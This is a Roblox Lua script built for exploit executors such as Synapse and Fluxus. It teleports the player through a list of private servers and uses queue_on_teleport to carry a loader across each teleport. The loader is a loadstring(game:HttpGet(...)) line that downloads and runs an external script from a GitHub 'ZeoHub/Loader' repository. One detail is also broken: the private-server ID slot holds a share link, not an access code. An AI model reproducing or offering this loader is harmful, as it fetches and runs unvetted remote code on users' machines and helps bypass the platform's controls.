local TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")

local placeId = game.PlaceId

-- List your private server IDs here, in order of preference
local privateServerIds = {
    "https://www.roblox.com/share?code=b35901cb37e539488443859bc139311b&type=Server", -- replace with your first private server ID
    "", -- replace with your second private server ID
    -- Add more IDs as needed
}

local q = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport)
local scriptToQueue = [[loadstring(game:HttpGet("https://raw.githubusercontent.com/ZeoHub/Loader/refs/heads/main/test.lua"))()]]

local function tryTeleportToPrivateServers()
    for _, privateServerId in ipairs(privateServerIds) do
        print("Trying to teleport to private server:", privateServerId)
        local teleportFailed = false
        local connection

        connection = TeleportService.TeleportInitFailed:Connect(function(player, teleportResult, errorMessage)
            warn("Teleport failed: " .. tostring(errorMessage))
            if teleportResult == Enum.TeleportResult.GameFull then
                warn("Private server is full, trying next in list...")
                teleportFailed = true
            else
                warn("Teleport failed for other reason: " .. tostring(teleportResult))
            end
            if connection then connection:Disconnect() end
        end)

        if q then
            q(scriptToQueue)
        end
        TeleportService:TeleportToPrivateServer(placeId, privateServerId, {Players.LocalPlayer})

        -- Wait for teleport or failure (simple timeout)
        local timeout = 10
        while timeout > 0 and not teleportFailed do
            task.wait(1)
            timeout = timeout - 1
        end

        if not teleportFailed then
            -- Success or another error, stop trying
            break
        end
    end
end

-- Example usage (call this when you want to teleport)
tryTeleportToPrivateServers()
